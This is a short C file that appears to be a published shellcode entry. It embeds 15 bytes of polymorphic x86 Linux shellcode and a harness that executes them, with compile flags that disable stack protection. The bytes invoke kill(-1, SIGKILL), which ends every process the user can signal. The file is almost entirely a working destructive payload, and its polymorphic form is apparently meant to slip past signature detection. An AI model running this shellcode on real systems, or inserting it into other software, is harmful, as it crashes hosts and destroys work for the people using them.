/**
* Filename: killall_poly_shellcode.c
* Author: h3ll0clar1c3
* Purpose: Terminates processes running on the local host   
* Compilation: gcc -fno-stack-protector -z execstack -m32 killall_poly_shellcode.c -o killall_poly_final
* Usage: ./killall_poly_final
* Shellcode size: 15 bytes
* Architecture: x86
**/

#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\x29\xc0\xb0\x25\x29\xdb\x4b\x29\xc9\xb1\xf7\xf6\xd9\xcd\x80";

int main()
{
        printf("Shellcode length: %d bytes\n", strlen(code));
        int (*ret)() = (int(*)())code;
        ret();
}
